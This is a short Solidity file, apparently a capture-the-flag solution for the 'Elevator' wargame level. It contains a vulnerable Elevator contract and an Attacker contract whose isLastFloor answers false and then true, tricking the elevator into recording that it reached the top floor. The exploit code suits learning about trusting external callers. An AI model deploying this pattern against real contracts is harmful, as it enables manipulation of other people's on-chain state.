// At least one I was able to get it without help :)
// Just crete another contract that inheritates Building interface where then
// we just adapt the abstract function to whatever we want.

pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


contract Attacker is Building {
    
    Elevator attacked;
    bool myTrick = true;
    
    constructor(address attackedAddress) public {
        attacked = Elevator(attackedAddress);
    }
    
    function isLastFloor(uint _floor) view public returns (bool) {
        if (myTrick) {
            myTrick = false;
            return false;
        } else {
            return true;
        }
        
    }
    
    function attack() public {
        attacked.goTo(2);
    }
}
